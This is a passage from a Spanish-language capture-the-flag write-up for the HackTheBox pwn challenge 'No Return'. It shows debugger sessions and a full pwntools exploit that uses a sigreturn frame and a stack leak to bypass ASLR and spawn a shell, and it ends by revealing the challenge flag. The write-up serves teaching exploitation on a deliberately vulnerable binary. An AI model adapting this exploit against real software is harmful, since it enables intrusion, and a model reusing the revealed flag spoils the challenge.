=&gt; <span class="code-dark-blue">0x401001</span>:    pop    rdi
<span class="code-green">gef➤</span>  x/4gx $rsp
<span class="code-dark-blue">0x7fffffffe700</span>: 0x00000000acdcacdc      0x0000000000000000  
<span class="code-dark-blue">0x7fffffffe710</span>: 0x0000000000000000      0x000000000000000f
<span class="code-green">gef➤</span>  si
<span class="code-dark-blue">0x0000000000401002</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><p>Ahora vamos a buscar la dirección donde se guarda <code>0x40105a</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  p/x $rdi
$1 = 0xacdcacdc
<span class="code-green">gef➤</span>  grep 0x40105a
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x5a\x10\x40</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffe6f0 - 0x7fffffffe6fc  →   "<span class="code-dark-magenta">\x5a\x10\x40[...]</span>"
</code></pre></div><p>Entonces <code>0xacdcacdc -> (0x7fffffffe6f0 - 1)</code>, de forma que <code>jmp QWORD PTR [rdi+0x1]</code> va a <code>0x40105a</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  set $rdi = 0x7fffffffe6f0 - 1  
</code></pre></div><p>Unos pasos después, tenemos que cambiar el valor de <code>$rcx</code>, que está puesto como <code>0xcafebabe</code>, y debería ser <code>0x401099</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  p/x $rcx
$2 = 0xcafebabe
<span class="code-green">gef➤</span>  grep 0x401099
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x99\x10\x40</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffe6f8 - 0x7fffffffe704  →   "<span class="code-dark-magenta">\x99\x10\x40[...]</span>"
  0x7fffffffe7d8 - 0x7fffffffe7e4  →   "<span class="code-dark-magenta">\x99\x10\x40[...]</span>"
</code></pre></div><p>Por tanto, <code>0xcafebabe -> 0x7fffffffe6f8</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  set $rcx = 0x7fffffffe6f8  
</code></pre></div><p>Finalmente, saltaremos al <em>gadget</em> y ejecutaremos <code>sys_rt_sigreturn</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  x/i $rip
=&gt; <span class="code-dark-blue">0x401099</span>:    syscall
<span class="code-green">gef➤</span>  p/x $rax
$3 = 0xf
<span class="code-green">gef➤</span>  x/40gx $rsp
<span class="code-dark-blue">0x7fffffffe730</span>: 0x0000000000000000      0x0000000000000000  
<span class="code-dark-blue">0x7fffffffe740</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe750</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe760</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe770</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe780</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe790</span>: 0x0000000000000000      0x00000000f00df00d
<span class="code-dark-blue">0x7fffffffe7a0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe7b0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe7c0</span>: 0x000000000000003b      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe7d0</span>: 0x0000000000000000      0x0000000000401099
<span class="code-dark-blue">0x7fffffffe7e0</span>: 0x0000000000000000      0x0000000000000033
<span class="code-dark-blue">0x7fffffffe7f0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe800</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe810</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7fffffffe820</span>: 0x0000000000000000      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe830</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe840</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe850</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe860</span>: 0x4141414141414141      0x4141414141414141
</code></pre></div><p>Al continuar un paso más, el <em>frame</em> se restaurará en los registros:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  si
<span class="code-dark-blue">0x0000000000401099</span> in <span class="code-dark-yellow">??</span> ()  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  info registers
rax            0x3b                0x3b
rbx            0x0                 0x0
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x0                 0x0
rdi            0xf00df00d          0xf00df00d  
rbp            0x0                 0x0
rsp            0x0                 0x0
...
rip            0x401099            0x401099
...
</code></pre></div><p>Y ahí está el ultimo valor (<code>0xf00df00d</code>), que debería ser la dirección donde está <code>"/bin/sh"</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  grep /bin/sh
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">/bin/sh</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-  
  0x7fffffffe6e8 - 0x7fffffffe6ef  →   "<span class="code-dark-magenta">/bin/sh</span>"
</code></pre></div><p>Y entonces <code>0xf00df00d -> 0x7fffffffe6e8</code>. Si cambiamos este valor y continuamos, tenemos una <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  set $rdi = 0x7fffffffe6e8
<span class="code-green">gef➤</span>  continue
Continuing.
process 1145760 is executing new program: /usr/bin/dash  
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x401000
</code></pre></div><p>Perfecto, vamos a modificar los valores de prueba y ver si el <em>exploit</em> funciona:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">176</span>

    <span class="mtk1">data</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40105a</span><span class="mtk1">)</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401099</span><span class="mtk1">)</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe6f0</span><span class="mtk1"> <span class="mtk5">-</span> <span class="mtk6">1</span>)</span>  <span class="mtk3"># rdi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                   <span class="mtk3"># rsi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                   <span class="mtk3"># rbp</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f</span><span class="mtk1">)</span>                 <span class="mtk3"># rdx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe6f8</span><span class="mtk1">)</span>      <span class="mtk3"># rcx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                   <span class="mtk3"># rbx</span>

    <span class="mtk1">frame</span> <span class="mtk5">=</span> <span class="mtk8 mtku">SigreturnFrame</span><span class="mtk1">()</span>
    <span class="mtk1">frame</span><span class="mtk1">.rax</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">3b</span>
    <span class="mtk1">frame</span><span class="mtk1">.rip</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">401099</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdi</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe6e8</span>
    <span class="mtk1">frame</span><span class="mtk1">.rsi</span> <span class="mtk5">=</span> <span class="mtk6">0</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdx</span> <span class="mtk5">=</span> <span class="mtk6">0</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">frame</span><span class="mtk1">)</span>

    <span class="mtk5">for</span> <span class="mtk1">i</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">),</span> <span class="mtk6">8</span><span class="mtk1">):</span>
        <span class="mtk8">send_data</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">i</span> <span class="mtk1">:</span> <span class="mtk1">i</span> <span class="mtk5">+</span> <span class="mtk6">8</span><span class="mtk1">],</span> <span class="mtk1">offset</span><span class="mtk1">)</span>  

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401000</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe700</span><span class="mtk1">)</span>   <span class="mtk3"># rsp</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Y sí, funciona:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './no-return'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './no-return': pid 1192591  
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
no-return  solve.py
</code></pre></div><h3 id="activación-de-aslr">Activación de ASLR</h3><p>Ahora tenemos que activar ASLR y saltárnoslo. Esto se puede hacer con las fugas de memoria que tenemos. Antes de habilitar ASLR, vamos a calcular las direcciones como un <em>offset</em> de la primera fuga de memoria. Para ello, sacaré la primera iteración fuera del bucle:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">176</span>

    <span class="mtk1">data</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span>
    <span class="mtk1">stack_leak</span> <span class="mtk5">=</span> <span class="mtk8">send_data</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk1">data</span><span class="mtk1">,</span> <span class="mtk1">offset</span><span class="mtk1">)</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack</span> <span class="mtk4">address</span> <span class="mtk4">leak:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40105a</span><span class="mtk1">)</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401099</span><span class="mtk1">)</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe6f0</span> <span class="mtk5">-</span> <span class="mtk6">1</span><span class="mtk1">)</span>  <span class="mtk3">#</span> <span class="mtk3">rdi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                   <span class="mtk3">#</span> <span class="mtk3">rsi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                   <span class="mtk3">#</span> <span class="mtk3">rbp</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f</span><span class="mtk1">)</span>                 <span class="mtk3">#</span> <span class="mtk3">rdx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe6f8</span><span class="mtk1">)</span>      <span class="mtk3">#</span> <span class="mtk3">rcx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                   <span class="mtk3">#</span> <span class="mtk3">rbx</span>

    <span class="mtk1">frame</span> <span class="mtk5">=</span> <span class="mtk8 mtku">SigreturnFrame</span><span class="mtk1">()</span>
    <span class="mtk1">frame</span><span class="mtk1">.rax</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">3b</span>
    <span class="mtk1">frame</span><span class="mtk1">.rip</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">401099</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdi</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe6e8</span>
    <span class="mtk1">frame</span><span class="mtk1">.rsi</span> <span class="mtk5">=</span> <span class="mtk6">0</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdx</span> <span class="mtk5">=</span> <span class="mtk6">0</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">frame</span><span class="mtk1">)</span>

    <span class="mtk5">for</span> <span class="mtk1">i</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">),</span> <span class="mtk6">8</span><span class="mtk1">):</span>
        <span class="mtk8">send_data</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">i</span> <span class="mtk1">:</span> <span class="mtk1">i</span> <span class="mtk5">+</span> <span class="mtk6">8</span><span class="mtk1">],</span> <span class="mtk1">offset</span><span class="mtk1">)</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401000</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffe700</span><span class="mtk1">)</span>   <span class="mtk3">#</span> <span class="mtk3">rsp</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './no-return'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './no-return': pid 1194870  
[<span class="code-blue">*</span>] Stack address leak: 0x7fffffffe7a0
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
no-return  solve.py
</code></pre></div><p>Estos son los <em>offsets</em> al <em>stack</em> <em>leak</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; stack_leak = 0x7fffffffe7a0  
&gt;&gt;&gt; 0x7fffffffe6f0 - stack_leak
-176
&gt;&gt;&gt; 0x7fffffffe6f8 - stack_leak
-168
&gt;&gt;&gt; 0x7fffffffe6e8 - stack_leak
-184
&gt;&gt;&gt; 0x7fffffffe700 - stack_leak
-160
</code></pre></div><p>Incluso podemos referenciarlos a <code>offset</code>, que es <code>176</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; offset = 176
&gt;&gt;&gt; 0x7fffffffe6f0 - (stack_leak - offset)  
0
&gt;&gt;&gt; 0x7fffffffe6f8 - (stack_leak - offset)
8
&gt;&gt;&gt; 0x7fffffffe6e8 - (stack_leak - offset)
-8
&gt;&gt;&gt; 0x7fffffffe700 - (stack_leak - offset)
16
</code></pre></div><p>Y así, tenemos este <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">176</span>

    <span class="mtk1">data</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span>
    <span class="mtk1">stack_leak</span> <span class="mtk5">=</span> <span class="mtk8">send_data</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk1">data</span><span class="mtk1">,</span> <span class="mtk1">offset</span><span class="mtk1">)</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack</span> <span class="mtk4">address</span> <span class="mtk4">leak:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">40105a</span><span class="mtk1">)</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401099</span><span class="mtk1">)</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">stack_leak</span> <span class="mtk5">-</span> <span class="mtk1">offset</span> <span class="mtk5">-</span> <span class="mtk6">1</span><span class="mtk1">)</span>      <span class="mtk3">#</span> <span class="mtk3">rdi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                            <span class="mtk3">#</span> <span class="mtk3">rsi</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                            <span class="mtk3">#</span> <span class="mtk3">rbp</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f</span><span class="mtk1">)</span>                          <span class="mtk3">#</span> <span class="mtk3">rdx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">stack_leak</span> <span class="mtk5">-</span> <span class="mtk1">offset</span> <span class="mtk5">+</span> <span class="mtk6">8</span><span class="mtk1">)</span>      <span class="mtk3">#</span> <span class="mtk3">rcx</span>
    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk6">0</span><span class="mtk1">)</span>                            <span class="mtk3">#</span> <span class="mtk3">rbx</span>

    <span class="mtk1">frame</span> <span class="mtk5">=</span> <span class="mtk8 mtku">SigreturnFrame</span><span class="mtk1">()</span>
    <span class="mtk1">frame</span><span class="mtk1">.rax</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">3b</span>
    <span class="mtk1">frame</span><span class="mtk1">.rip</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">401099</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdi</span> <span class="mtk5">=</span> <span class="mtk1">stack_leak</span> <span class="mtk5">-</span> <span class="mtk1">offset</span> <span class="mtk5">-</span> <span class="mtk6">8</span>
    <span class="mtk1">frame</span><span class="mtk1">.rsi</span> <span class="mtk5">=</span> <span class="mtk6">0</span>
    <span class="mtk1">frame</span><span class="mtk1">.rdx</span> <span class="mtk5">=</span> <span class="mtk6">0</span>

    <span class="mtk1">data</span> <span class="mtk5">+=</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">frame</span><span class="mtk1">)</span>

    <span class="mtk5">for</span> <span class="mtk1">i</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">),</span> <span class="mtk6">8</span><span class="mtk1">):</span>
        <span class="mtk8">send_data</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">,</span> <span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">i</span> <span class="mtk1">:</span> <span class="mtk1">i</span> <span class="mtk5">+</span> <span class="mtk6">8</span><span class="mtk1">],</span> <span class="mtk1">offset</span><span class="mtk1">)</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">401000</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64(</span><span class="mtk1">stack_leak</span> <span class="mtk5">-</span> <span class="mtk1">offset</span> <span class="mtk5">+</span> <span class="mtk6">16</span><span class="mtk1">)</span>  <span class="mtk3">#</span> <span class="mtk3">rsp</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>

    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Lo podemos ejecutar con ASLR habilitado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 2 | <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
2
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './no-return'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './no-return': pid 891062  
[<span class="code-blue">*</span>] Stack address leak: 0x7ffd133ea7e0
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
no-return  solve.py
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Genial, ahora vamos a ejecutarlo en el servidor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 157.245.46.136:31468
[<span class="code-blue">*</span>] './no-return'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Opening connection to 157.245.46.136 on port 31468: Done
[<span class="code-blue">*</span>] Stack address leak: 0x7ffeff950900
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
11a866b981670122c056ee96ebb0796910a7495dc3ee2368fd127626af9e1b16-flag.txt
no-return
run_challenge.sh
<span class="code-red">$</span> cat 11a866b981670122c056ee96ebb0796910a7495dc3ee2368fd127626af9e1b16-flag.txt  
HTB{y0uv3_35c4p3d_7h3_v01d_0f_n0_r37urn}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/No%20Return/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#analizando-código-ensamblador">Analizando código ensamblador</a></li><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#perfeccionando-la-estrategia">Perfeccionando la estrategia</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a 